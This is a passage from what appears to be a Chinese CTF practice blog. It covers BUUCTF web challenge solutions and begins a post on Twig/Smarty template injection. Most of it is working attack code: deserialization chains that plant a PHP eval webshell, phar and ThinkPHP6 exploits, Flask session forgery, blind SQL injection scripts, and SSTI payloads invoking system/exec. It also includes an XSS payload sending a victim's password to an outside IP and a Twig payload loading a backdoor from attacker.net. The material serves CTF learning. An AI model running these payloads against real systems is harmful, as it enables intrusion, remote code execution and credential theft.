$this-\u0026gt;filename=md5($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;]).\u0026#34;.png\u0026#34;; $this-\u0026gt;ext_check(); } if($this-\u0026gt;ext) { if(getimagesize($this-\u0026gt;filename_tmp)) { @copy($this-\u0026gt;filename_tmp, $this-\u0026gt;filename); @unlink($this-\u0026gt;filename_tmp); $this-\u0026gt;img=\u0026#34;../upload/$this-\u0026gt;upload_menu/$this-\u0026gt;filename\u0026#34;; $this-\u0026gt;update_img(); } public function update_img(){ $user_info=db(\u0026#39;user\u0026#39;)-\u0026gt;where(\u0026#34;ID\u0026#34;,$this-\u0026gt;checker-\u0026gt;profile[\u0026#39;ID\u0026#39;])-\u0026gt;find(); if(empty($user_info[\u0026#39;img\u0026#39;]) \u0026amp;\u0026amp; $this-\u0026gt;img){ if(db(\u0026#39;user\u0026#39;)-\u0026gt;where(\u0026#39;ID\u0026#39;,$user_info[\u0026#39;ID\u0026#39;])-\u0026gt;data([\u0026#34;img\u0026#34;=\u0026gt;addslashes($this-\u0026gt;img)])-\u0026gt;update()){ $this-\u0026gt;update_cookie(); $this-\u0026gt;success(\u0026#39;Upload img successful!\u0026#39;, url(\u0026#39;../home\u0026#39;)); }else{ $this-\u0026gt;error(\u0026#39;Upload file failed!\u0026#39;, url(\u0026#39;../index\u0026#39;)); } } } 第一次上传就能使empty=1，绕过.png的拼接\n要使ext=1\nindex.php里面会反序列化cookie\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php namespace app\\web\\controller; class Register{ public $checker; public $registed =0;//目的是过destruct里的if; } class Profile{ public $checker =0 ;//目的是绕过index类的检查，防止退出程序 public $filename_tmp=\u0026#34;./upload/9987df285bb375eda68448315c5656e5/4a47a0db6e60853dedfcfdf08a5ca249.png\u0026#34;; public $upload_menu; public $filename=\u0026#34;upload/shell.php\u0026#34;; public $ext=1;//目的是过if来调用复制webshell public $img; public $except=array(\u0026#34;index\u0026#34;=\u0026gt;\u0026#34;upload_img\u0026#34;);//目的是通过__get()魔术方法调用upload_Img函数 } $a = new Register(); $a-\u0026gt;checker = new Profile();//目的是调用POP链 $a-\u0026gt;checker-\u0026gt;checker=0；//调用pop链防止退出程序 echo base64_encode(serialize($a)); cookie替换完访问/upload/shell.php\n[CISCN2019 华东南赛区]Web4 file协议读不出来，猜测python写的界面\n利用local_file://协议读文件，或者什么都不用直接读文件\n1 /read?url=local_file:///etc/passwd 读app.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 import re, random, uuid, urllib from flask import Flask, session, request app = Flask(__name__) random.seed(uuid.getnode()) app.config[\u0026#39;SECRET_KEY\u0026#39;] = str(random.random()*233) app.debug = True @app.route(\u0026#39;/\u0026#39;) def index(): session[\u0026#39;username\u0026#39;] = \u0026#39;www-data\u0026#39; return \u0026#39;Hello World! \u0026lt;a href=\u0026#34;/read?url=https://baidu.com\u0026#34;\u0026gt;Read somethings\u0026lt;/a\u0026gt;\u0026#39; @app.route(\u0026#39;/read\u0026#39;) def read(): try: url = request.args.get(\u0026#39;url\u0026#39;) m = re.findall(\u0026#39;^file.*\u0026#39;, url, re.IGNORECASE) n = re.findall(\u0026#39;flag\u0026#39;, url, re.IGNORECASE) if m or n: return \u0026#39;No Hack\u0026#39; res = urllib.urlopen(url) return res.read() except Exception as ex: print str(ex) return \u0026#39;no response\u0026#39; @app.route(\u0026#39;/flag\u0026#39;) def flag(): if session and session[\u0026#39;username\u0026#39;] == \u0026#39;fuck\u0026#39;: return open(\u0026#39;/flag.txt\u0026#39;).read() else: return \u0026#39;Access denied\u0026#39; if __name__==\u0026#39;__main__\u0026#39;: app.run( debug=True, host=\u0026#34;0.0.0.0\u0026#34; ) 可以看到要访问flag路由，而且session里面的username要为fuck\nusername那个字段是base64编码后的www-data\n要知道secret-key就能伪造了\n伪造session首先要拿到secret_key，看一下secret_key的生成方式\n1 2 random.seed(uuid.getnode()) //种子是uuid.getnode(),即机器的固定标识符，根据mac地址转化为十进制数 app.config[\u0026#39;SECRET_KEY\u0026#39;] = str(random.random()*233) //这里有了种子就可以自己生成secret_key 读取/sys/class/net/eth0/address获取mac地址\n4e:46:44:62:43:f0\n1 2 3 4 import random random.seed(0x4e46446243f0) print(str(random.random()*233)) //12.498945071696037 然后flask-session伪造\n这里是py2环境\n1 python flask_session_cookie_manager2.py encode -s 12.498945071696037 -t \u0026#34;{\u0026#39;username\u0026#39;:b\u0026#39;fuck\u0026#39;}\u0026#34; [GXYCTF2019]BabysqliV3.0 弱口令admin/password\n进去伪协议读源码\nupload.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 \u0026lt;?php error_reporting(0); class Uploader{ public $Filename; public $cmd; public $token; function __construct(){ $sandbox = getcwd().\u0026#34;/uploads/\u0026#34;.md5($_SESSION[\u0026#39;user\u0026#39;]).\u0026#34;/\u0026#34;; $ext = \u0026#34;.txt\u0026#34;; @mkdir($sandbox, 0777, true); if(isset($_GET[\u0026#39;name\u0026#39;]) and !preg_match(\u0026#34;/data:\\/\\/ | filter:\\/\\/ | php:\\/\\/ | \\./i\u0026#34;, $_GET[\u0026#39;name\u0026#39;])){ $this-\u0026gt;Filename = $_GET[\u0026#39;name\u0026#39;]; } else{ $this-\u0026gt;Filename = $sandbox.$_SESSION[\u0026#39;user\u0026#39;].$ext; } $this-\u0026gt;cmd = \u0026#34;echo \u0026#39;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;Master, I want to study rizhan!\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026#39;;\u0026#34;; $this-\u0026gt;token = $_SESSION[\u0026#39;user\u0026#39;]; } function upload($file){ global $sandbox; global $ext; if(preg_match(\u0026#34;[^a-z0-9]\u0026#34;, $this-\u0026gt;Filename)){ $this-\u0026gt;cmd = \u0026#34;die(\u0026#39;illegal filename!\u0026#39;);\u0026#34;; } else{ if($file[\u0026#39;size\u0026#39;] \u0026gt; 1024){ $this-\u0026gt;cmd = \u0026#34;die(\u0026#39;you are too big (′▽`〃)\u0026#39;);\u0026#34;; } else{ $this-\u0026gt;cmd = \u0026#34;move_uploaded_file(\u0026#39;\u0026#34;.$file[\u0026#39;tmp_name\u0026#39;].\u0026#34;\u0026#39;, \u0026#39;\u0026#34; . $this-\u0026gt;Filename . \u0026#34;\u0026#39;);\u0026#34;; } } } function __toString(){ global $sandbox; global $ext; // return $sandbox.$this-\u0026gt;Filename.$ext; return $this-\u0026gt;Filename; } function __destruct(){ if($this-\u0026gt;token != $_SESSION[\u0026#39;user\u0026#39;]){ $this-\u0026gt;cmd = \u0026#34;die(\u0026#39;check token falied!\u0026#39;);\u0026#34;; } eval($this-\u0026gt;cmd); } } if(isset($_FILES[\u0026#39;file\u0026#39;])) { $uploader = new Uploader(); $uploader-\u0026gt;upload($_FILES[\u0026#34;file\u0026#34;]); if(@file_get_contents($uploader)){ echo \u0026#34;下面是你上传的文件：\u0026lt;br\u0026gt;\u0026#34;.$uploader.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo file_get_contents($uploader); } } ?\u0026gt; phar反序列化\n非预期，filename可控，直接传参\n1 /home.php?file=upload\u0026amp;name=/var/www/html/flag.php 得到flag\n原来还有一个直接上传一句话木马的非预期估计给修了\n1 2 3 4 if($this-\u0026gt;token != $_SESSION[\u0026#39;user\u0026#39;]){ $this-\u0026gt;cmd = \u0026#34;die(\u0026#39;check token falied!\u0026#39;);\u0026#34;; } eval($this-\u0026gt;cmd); token可以通过随便上传文件来获取\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;?php class Uploader{ public $Filename; public $cmd; public $token; } $upload = new Uploader(); $upload-\u0026gt;cmd = \u0026#34;highlight_file(\u0026#39;/var/www/html/flag.php\u0026#39;);\u0026#34;; $upload-\u0026gt;Filename = \u0026#39;test\u0026#39;; $upload-\u0026gt;token = \u0026#39;GXY063c630ae7ab41c6fd121cb4851620a3\u0026#39;; $phar = new Phar(\u0026#34;exp.phar\u0026#34;); $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#39;GIF89a\u0026#39;.\u0026#39;\u0026lt;?php __HALT_COMPILER(); ? \u0026gt;\u0026#39;); $phar-\u0026gt;setMetadata($upload); $phar-\u0026gt;addFromString(\u0026#34;exp.txt\u0026#34;, \u0026#34;test\u0026#34;); $phar-\u0026gt;stopBuffering(); [pasecactf_2019]flask_ssti 简单的ssti\n过滤下划线和单引号，16进制绕过\n1 {{config[\u0026#34;\\x5f\\x5fclass\\x5f\\x5f\u0026#34;][\u0026#34;\\x5f\\x5finit\\x5f\\x5f\u0026#34;][\u0026#34;\\x5f\\x5fglobals\\x5f\\x5f\u0026#34;][\u0026#34;os\u0026#34;][\u0026#34;popen\u0026#34;](\u0026#34;whoami\u0026#34;)[\u0026#34;read\u0026#34;]()}} flag不在目录\n读config看到加密后的\n1 2 3 4 def encode(line, key, key2): return \u0026#39;\u0026#39;.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line))) app.config[\u0026#39;flag\u0026#39;] = encode(\u0026#39;\u0026#39;, \u0026#39;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W34\u0026#39;, \u0026#39;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT5\u0026#39;) 由于是异或再运行一遍就行了\n或者读proc/self/fd/3\n因为fd目录可以读到被删的的文件内容\n但是上面直接读是没有的\n因为self指向前面的popen，popen跟flag操作无关\n我们先读ps进程，读到pid为1\n1 cat /proc/1/fd/3 [EIS 2019]EzPOP 构造pop链\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026lt;?php class A { protected $store; protected $key; protected $expire; public function __construct($store,$key,$expire) { $this-\u0026gt;key=$key; $this-\u0026gt;expire=$expire; $this-\u0026gt;store=$store; } } class B{ public $option; } $b=new B(); $b-\u0026gt;options[\u0026#39;serialize\u0026#39;]=\u0026#39;base64_decode\u0026#39;; $b-\u0026gt;options[\u0026#39;data_compress\u0026#39;]=false; $b-\u0026gt;options[\u0026#39;prefix\u0026#39;]=\u0026#39;php://filter/write=string.strip_tags|convert.base64-decode/resource=uploads/\u0026#39;; $a=new A($b,\u0026#39;shell.php\u0026#39;,0); $a-\u0026gt;autosave=false; $a-\u0026gt;cache=array(); $a-\u0026gt;complete=base64_encode(base64_encode(\u0026#39;\u0026lt;?php @eval($_POST[\u0026#34;cmd\u0026#34;]); ?\u0026gt;\u0026#39;)); echo urlencode(serialize($a)); ?\u0026gt; [GWCTF 2019]mypassword 注册登入后查看feedback.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 if(is_array($feedback)){ echo \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;反馈不合法\u0026#39;);\u0026lt;/script\u0026gt;\u0026#34;; return false; } $blacklist = [\u0026#39;_\u0026#39;,\u0026#39;\\\u0026#39;\u0026#39;,\u0026#39;\u0026amp;\u0026#39;,\u0026#39;\\\\\u0026#39;,\u0026#39;#\u0026#39;,\u0026#39;%\u0026#39;,\u0026#39;input\u0026#39;,\u0026#39;script\u0026#39;,\u0026#39;iframe\u0026#39;,\u0026#39;host\u0026#39;,\u0026#39;onload\u0026#39;,\u0026#39;onerror\u0026#39;,\u0026#39;srcdoc\u0026#39;,\u0026#39;location\u0026#39;,\u0026#39;svg\u0026#39;,\u0026#39;form\u0026#39;,\u0026#39;img\u0026#39;,\u0026#39;src\u0026#39;,\u0026#39;getElement\u0026#39;,\u0026#39;document\u0026#39;,\u0026#39;cookie\u0026#39;]; foreach ($blacklist as $val) { while(true){ if(stripos($feedback,$val) !== false){ $feedback = str_ireplace($val,\u0026#34;\u0026#34;,$feedback); }else{ break; } } } 黑名单一看就是xss\n由于前面login.js\n1 2 3 4 5 6 7 8 9 10 11 12 13 if (document.cookie \u0026amp;\u0026amp; document.cookie != \u0026#39;\u0026#39;) { var cookies = document.cookie.split(\u0026#39;; \u0026#39;); var cookie = {}; for (var i = 0; i \u0026lt; cookies.length; i++) { var arr = cookies[i].split(\u0026#39;=\u0026#39;); var key = arr[0]; cookie[key] = arr[1]; } if(typeof(cookie[\u0026#39;user\u0026#39;]) != \u0026#34;undefined\u0026#34; \u0026amp;\u0026amp; typeof(cookie[\u0026#39;psw\u0026#39;]) != \u0026#34;undefined\u0026#34;){ document.getElementsByName(\u0026#34;username\u0026#34;)[0].value = cookie[\u0026#39;user\u0026#39;]; document.getElementsByName(\u0026#34;password\u0026#34;)[0].value = cookie[\u0026#39;psw\u0026#39;]; } } 记住密码功能会将读取cookie中的password\n于是构造一个登录框并且引入login.js提交反馈等待bot点开获得flag\n1 2 3 4 5 6 7 \u0026lt;incookieput type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34;\u0026gt; \u0026lt;incookieput type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34;\u0026gt; \u0026lt;scrcookieipt scookierc=\u0026#34;./js/login.js\u0026#34;\u0026gt;\u0026lt;/scrcookieipt\u0026gt; \u0026lt;scrcookieipt\u0026gt; var psw = docucookiement.getcookieElementsByName(\u0026#34;password\u0026#34;)[0].value; docucookiement.locacookietion=\u0026#34;http://47.122.53.248:2333/?psw=\u0026#34;+psw; \u0026lt;/scrcookieipt\u0026gt; [HFCTF2020]BabyUpload 源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 \u0026lt;?php error_reporting(0); session_save_path(\u0026#34;/var/babyctf/\u0026#34;); session_start(); require_once \u0026#34;/flag\u0026#34;; highlight_file(__FILE__); if($_SESSION[\u0026#39;username\u0026#39;] ===\u0026#39;admin\u0026#39;) { $filename=\u0026#39;/var/babyctf/success.txt\u0026#39;; if(file_exists($filename)){ safe_delete($filename); die($flag); } } else{ $_SESSION[\u0026#39;username\u0026#39;] =\u0026#39;guest\u0026#39;; } $direction = filter_input(INPUT_POST, \u0026#39;direction\u0026#39;); $attr = filter_input(INPUT_POST, \u0026#39;attr\u0026#39;); $dir_path = \u0026#34;/var/babyctf/\u0026#34;.$attr; if($attr===\u0026#34;private\u0026#34;){ $dir_path .= \u0026#34;/\u0026#34;.$_SESSION[\u0026#39;username\u0026#39;]; } if($direction === \u0026#34;upload\u0026#34;){ try{ if(!is_uploaded_file($_FILES[\u0026#39;up_file\u0026#39;][\u0026#39;tmp_name\u0026#39;])){ throw new RuntimeException(\u0026#39;invalid upload\u0026#39;); } $file_path = $dir_path.\u0026#34;/\u0026#34;.$_FILES[\u0026#39;up_file\u0026#39;][\u0026#39;name\u0026#39;]; $file_path .= \u0026#34;_\u0026#34;.hash_file(\u0026#34;sha256\u0026#34;,$_FILES[\u0026#39;up_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]); if(preg_match(\u0026#39;/(\\.\\.\\/|\\.\\.\\\\\\\\)/\u0026#39;, $file_path)){ throw new RuntimeException(\u0026#39;invalid file path\u0026#39;); } @mkdir($dir_path, 0700, TRUE); if(move_uploaded_file($_FILES[\u0026#39;up_file\u0026#39;][\u0026#39;tmp_name\u0026#39;],$file_path)){ $upload_result = \u0026#34;uploaded\u0026#34;; }else{ throw new RuntimeException(\u0026#39;error while saving\u0026#39;); } } catch (RuntimeException $e) { $upload_result = $e-\u0026gt;getMessage(); } } elseif ($direction === \u0026#34;download\u0026#34;) { try{ $filename = basename(filter_input(INPUT_POST, \u0026#39;filename\u0026#39;)); $file_path = $dir_path.\u0026#34;/\u0026#34;.$filename; if(preg_match(\u0026#39;/(\\.\\.\\/|\\.\\.\\\\\\\\)/\u0026#39;, $file_path)){ throw new RuntimeException(\u0026#39;invalid file path\u0026#39;); } if(!file_exists($file_path)) { throw new RuntimeException(\u0026#39;file not exist\u0026#39;); } header(\u0026#39;Content-Type: application/force-download\u0026#39;); header(\u0026#39;Content-Length: \u0026#39;.filesize($file_path)); header(\u0026#39;Content-Disposition: attachment; filename=\u0026#34;\u0026#39;.substr($filename, 0, -65).\u0026#39;\u0026#34;\u0026#39;); if(readfile($file_path)){ $download_result = \u0026#34;downloaded\u0026#34;; }else{ throw new RuntimeException(\u0026#39;error while saving\u0026#39;); } } catch (RuntimeException $e) { $download_result = $e-\u0026gt;getMessage(); } exit; } ?\u0026gt; 由于session是PHPSESSID我们直接sess_sessid查看session文件\n处理器应该为php_binary\n脚本伪造session文件\n1 2 3 4 5 6 \u0026lt;?php ini_set(\u0026#39;session.serialize_handler\u0026#39;, \u0026#39;php_binary\u0026#39;); session_save_path(\u0026#34;./\u0026#34;); session_start(); $_SESSION[\u0026#39;username\u0026#39;] = \u0026#39;admin\u0026#39;; 文件名改为sess，利用hash_file来计算sha256\n1 2 \u0026lt;?php echo hash_file(\u0026#39;sha256\u0026#39;, \u0026#39;./sess\u0026#39;); 得到文件名sess_432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4\n上传用postman\n或者脚本传\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import requests import hashlib from io import BytesIO def BeAdmin(): # print(BytesIO(\u0026#39;\\x08usernames:5:\u0026#34;admin\u0026#34;;\u0026#39;.encode(\u0026#39;utf-8\u0026#39;))) files = { \u0026#34;up_file\u0026#34;: (\u0026#34;sess\u0026#34;, BytesIO(\u0026#39;\\x08usernames:5:\u0026#34;admin\u0026#34;;\u0026#39;.encode(\u0026#39;utf-8\u0026#39;))) } data = { \u0026#39;attr\u0026#39;:\u0026#39;.\u0026#39;, \u0026#39;direction\u0026#39;:\u0026#39;upload\u0026#39; } url = \u0026#39;http://375fb983-49c0-4074-a8e6-6c98e5206ddc.node5.buuoj.cn:81/\u0026#39; r = requests.post(url=url,data=data,files=files) session_id = hashlib.sha256(\u0026#39;\\x08usernames:5:\u0026#34;admin\u0026#34;;\u0026#39;.encode(\u0026#39;utf-8\u0026#39;)).hexdigest() return session_id 这里我用apifox,上传用upload\n接着上传success.txt\n然后把session值改一下就行了\n[SWPU2019]Web4 上来盲注出备份文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 #author: c1e4r import requests import json import time def main(): #题目地址 url = \u0026#39;\u0026#39;\u0026#39;http://f30f0574-3492-4a09-a14f-203db6705c1a.node5.buuoj.cn:81/index.php?r=Login/Login\u0026#39;\u0026#39;\u0026#39; #注入payload payloads = \u0026#34;asd\u0026#39;;set @a=0x{0};prepare ctftest from @a;execute ctftest-- -\u0026#34; flag = \u0026#39;\u0026#39; for i in range(1,30): #查询payload payload = \u0026#34;select if(ascii(substr((select flag from flag),{0},1))={1},sleep(3),1)\u0026#34; for j in range(0,128): #将构造好的payload进行16进制转码和json转码 datas = {\u0026#39;username\u0026#39;:payloads.format(str_to_hex(payload.format(i,j))),\u0026#39;password\u0026#39;:\u0026#39;test213\u0026#39;} data = json.dumps(datas) times = time.time() res = requests.post(url = url, data = data) if time.time() - times \u0026gt;= 3: flag = flag + chr(j) print(flag) break def str_to_hex(s): return \u0026#39;\u0026#39;.join([hex(ord(c)).replace(\u0026#39;0x\u0026#39;, \u0026#39;\u0026#39;) for c in s]) if __name__ == \u0026#39;__main__\u0026#39;: main() glzjin_wants_a_girl_friend.zip\n审计源码发现listdata这个变量可控，userindex.php里面可以传入img_file跟flag路径就可以读取了\n1 index.php?r=User/Index\u0026amp;img_file=/../flag.php [安洵杯 2019]iamthinking www.zip下载源码\nthinkphp6反序列化\n最后一步要用parse_url的漏洞加//就行\npoc工具https://github.com/wh1t3p1g/phpggc\n利用链\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 think\\Model --\u0026gt; __destruct() think\\Model --\u0026gt; save() think\\Model --\u0026gt; updateData() think\\Model --\u0026gt; checkAllowFields() think\\Model --\u0026gt; db() 后半部分利用链（同tp 5.2后半部分利用链) think\\model\\concern\\Conversion --\u0026gt; __toString() think\\model\\concern\\Conversion --\u0026gt; __toJson() think\\model\\concern\\Conversion --\u0026gt; __toArray() think\\model\\concern\\Attribute --\u0026gt; getAttr() think\\model\\concern\\Attribute --\u0026gt; getValue() exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 \u0026lt;?php namespace think\\model\\concern { trait Conversion { } trait Attribute { private $data; private $withAttr = [\u0026#34;xxx\u0026#34; =\u0026gt; \u0026#34;system\u0026#34;]; public function get() { $this-\u0026gt;data = [\u0026#34;xxx\u0026#34; =\u0026gt; \u0026#34;cat /flag\u0026#34;]; } } } namespace think{ abstract class Model{ use model\\concern\\Attribute; use model\\concern\\Conversion; private $lazySave; protected $withEvent; private $exists; private $force; protected $field; protected $schema; protected $table; function __construct(){ $this-\u0026gt;lazySave = true; $this-\u0026gt;withEvent = false; $this-\u0026gt;exists = true; $this-\u0026gt;force = true; $this-\u0026gt;field = []; $this-\u0026gt;schema = []; $this-\u0026gt;table = true; } } } namespace think\\model{ use think\\Model; class Pivot extends Model { function __construct($obj=\u0026#39;\u0026#39;) { //定义this-\u0026gt;data不为空 parent::__construct(); $this-\u0026gt;get(); $this-\u0026gt;table = $obj; } } $a = new Pivot(); $b = new Pivot($a); echo urlencode(serialize($b)); } [PASECA2019]honey_shop 图片有任意文件读取\n读取proc/self/enviorn\n读到secretkey伪造session\n1 F5SmhLBQtsPYGpBRZxe56E0Nwk7LJ369gSI2Kl4h [Black Watch 入群题]Web 盲注\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 import requests flag=\u0026#39;\u0026#39; #查库名 payload1 = \u0026#39;1^(ascii(substr((select(database())),{},1))\u0026gt;{})^1\u0026#39; #库名为news #查表名 payload2 = \u0026#39;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=\\\u0026#39;news\\\u0026#39;)),{},1))\u0026gt;{})^1\u0026#39; #表名为admin,contents #查字段 payload3 = \u0026#39;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=\\\u0026#39;contents\\\u0026#39;)),{},1))\u0026gt;{})^1\u0026#39; #admin表里有id,username,password,is_enable # contents表里有id,title,content,is_enable #查字段值 payload4 = \u0026#39;1^(ascii(substr((select(group_concat(password))from(admin)),{},1))\u0026gt;{})^1\u0026#39; #分别查username和password for i in range(1,100): low =28 high =137 mid = (low + high) // 2 while(low \u0026lt; high): url = \u0026#39;http://f695d102-a73b-4b8a-a546-b63ea583f09f.node5.buuoj.cn:81/backend/content_detail.php?id=\u0026#39; payload = payload4.format(i,mid) url+=payload print(url) r = requests.get(url) text = str(r.json()) if \u0026#34;札师傅缺个女朋友\u0026#34; in text: low = mid + 1 else: high = mid mid = (low + high) // 2 if(chr(mid)==\u0026#39;\u0026#39;): break flag +=chr(mid) print(flag) print(flag) [GoogleCTF2019 Quals]Bnv ","date":"2025-01-10T00:00:00Z","image":"https://0d000721999.github.io/p/buuctf%E5%88%B7%E9%A2%98/1.png","permalink":"https://0d000721999.github.io/p/buuctf%E5%88%B7%E9%A2%98/","title":"buuctf刷题"},{"content":"php下的SSTI(twig和smarty) Twig 参考：文章 - Twig 模板注入从零到一 - 先知社区\n先上payload\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 {{\u0026#39;/etc/passwd\u0026#39;|file_excerpt(1,30)}} {{app.request.files.get(1).__construct(\u0026#39;/etc/passwd\u0026#39;,\u0026#39;\u0026#39;)}} {{app.request.files.get(1).openFile.fread(99)}} {{_self.env.registerUndefinedFilterCallback(\u0026#34;exec\u0026#34;)}}{{_self.env.getFilter(\u0026#34;whoami\u0026#34;)}} {{_self.env.enableDebug()}}{{_self.env.isDebug()}} {{[\u0026#34;id\u0026#34;]|map(\u0026#34;system\u0026#34;)|join(\u0026#34;,\u0026#34;) {{{\u0026#34;\u0026lt;?php phpinfo();\u0026#34;:\u0026#34;/var/www/html/shell.php\u0026#34;}|map(\u0026#34;file_put_contents\u0026#34;)}} {{[\u0026#34;id\u0026#34;,0]|sort(\u0026#34;system\u0026#34;)|join(\u0026#34;,\u0026#34;)}} {{[\u0026#34;id\u0026#34;]|filter(\u0026#34;system\u0026#34;)|join(\u0026#34;,\u0026#34;)}} {{[0,0]|reduce(\u0026#34;system\u0026#34;,\u0026#34;id\u0026#34;)|join(\u0026#34;,\u0026#34;)}} {{[\u0026#39;cat /etc/passwd\u0026#39;]|filter(\u0026#39;system\u0026#39;)}} twig 1.x 测试代码\n1 2 3 4 5 6 7 8 9 \u0026lt;?php include __DIR__.\u0026#39;/vendor/twig/twig/lib/Twig/Autoloader.php\u0026#39;; Twig_Autoloader::register(); $loader = new Twig_Loader_String(); $twig = new Twig_Environment($loader); echo $twig-\u0026gt;render($_GET[\u0026#39;name\u0026#39;]); ?\u0026gt; 在 Twig 1.x 中存在三个全局变量：\n_self：引用当前模板的实例。 _context：引用当前上下文。 _charset：引用当前字符集。 对应的代码是：\n1 2 3 4 5 protected $specialVars = [ \u0026#39;_self\u0026#39; =\u0026gt; \u0026#39;$this\u0026#39;, \u0026#39;_context\u0026#39; =\u0026gt; \u0026#39;$context\u0026#39;, \u0026#39;_charset\u0026#39; =\u0026gt; \u0026#39;$this-\u0026gt;env-\u0026gt;getCharset()\u0026#39;, ]; 这里主要就是利用 _self 变量，它会返回当前 \\Twig\\Template 实例，并提供了指向 Twig_Environment 的 env 属性，这样我们就可以继续调用 Twig_Environment 中的其他方法，从而进行 SSTI。\n比如以下 Payload 可以调用 setCache 方法改变 Twig 加载 PHP 文件的路径，在 allow_url_include 开启的情况下我们可以通过改变路径实现远程文件包含：\n1 {{_self.env.setCache(\u0026#34;ftp://attacker.net:2121\u0026#34;)}}{{_self.env.loadTemplate(\u0026#34;backdoor\u0026#34;)}} 此外还有 getFilter 方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 public function getFilter($name) { ... foreach ($this-\u0026gt;filterCallbacks as $callback) { if (false !== $filter = call_user_func($callback, $name)) { return $filter; } } return false; } public function registerUndefinedFilterCallback($callable) { $this-\u0026gt;filterCallbacks[] = $callable; } 我们在 getFilter 里发现了危险函数 call_user_func。通过传递参数到该函数中，我们可以调用任意 PHP 函数。Payload 如下：\n1 {{_self.env.registerUndefinedFilterCallback(\u0026#34;exec\u0026#34;)}}{{_self.env.getFilter(\u0026#34;id\u0026#34;)}} 但是在 Twig 2.x 及 Twig 3.x 以后，_self 的作用发生了变化，只能返回当前实例名字符串,所以以上 Payload 只能适用于 Twig 1.x 。\ntwig 2.x/3.x 测试代码\n1 2 3 4 5 6 7 8 9 \u0026lt;?php require_once __DIR__.\u0026#39;/vendor/autoload.php\u0026#39;; $loader = new \\Twig\\Loader\\ArrayLoader(); $twig = new \\Twig\\Environment($loader); $template = $twig-\u0026gt;createTemplate(\u0026#34;Hello {$_GET[\u0026#39;name\u0026#39;]}!\u0026#34;); echo $template-\u0026gt;render(); map过滤器 在 Twig 3.x 中，map 这个过滤器可以允许用户传递一个箭头函数，并将这个箭头函数应用于序列或映射的元素：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 {% set people = [ {first: \u0026#34;Bob\u0026#34;, last: \u0026#34;Smith\u0026#34;}, {first: \u0026#34;Alice\u0026#34;, last: \u0026#34;Dupond\u0026#34;}, ] %} {{ people|map(p =\u0026gt; \u0026#34;#{p.first} #{p.last}\u0026#34;)|join(\u0026#39;, \u0026#39;) }} // Output: outputs Bob Smith, Alice Dupond {% set people = { \u0026#34;Bob\u0026#34;: \u0026#34;Smith\u0026#34;, \u0026#34;Alice\u0026#34;: \u0026#34;Dupond\u0026#34;, } %} {{ people|map((last, first) =\u0026gt; \u0026#34;#{first} #{last}\u0026#34;)|join(\u0026#39;, \u0026#39;) }} // Output: outputs Bob Smith, Alice Dupond 当我们如下使用 map 时：\n1 {{[\u0026#34;Mark\u0026#34;]|map((arg)=\u0026gt;\u0026#34;Hello #{arg}!\u0026#34;)}} 3.x会编译成\n1 twig_array_map([0 =\u0026gt; \u0026#34;Mark\u0026#34;], function ($__arg__) use ($context, $macros) { $context[\u0026#34;arg\u0026#34;] = $__arg__; return (\u0026#34;hello \u0026#34; . ($context[\u0026#34;arg\u0026#34;] ?? null))}) 这个 twig_array_map 函数的源码如下：\n1 2 3 4 5 6 7 8 9 function twig_array_map($array, $arrow) { $r = []; foreach ($array as $k =\u0026gt; $v) { $r[$k] = $arrow($v, $k); // 直接将 $arrow 当做函数执行 } return $r; } 从上面的代码我们可以看到，传入的 $arrow 直接就被当成函数执行，即 $arrow($v, $k)，而 $v 和 $k 分别是 $array 中的 value 和 key。$array 和 $arrow 都是我们我们可控的，那我们可以不传箭头函数，直接传一个可传入两个参数的、能够命令执行的危险函数名即可实现命令执行。通过查阅常见的命令执行函数：\n1 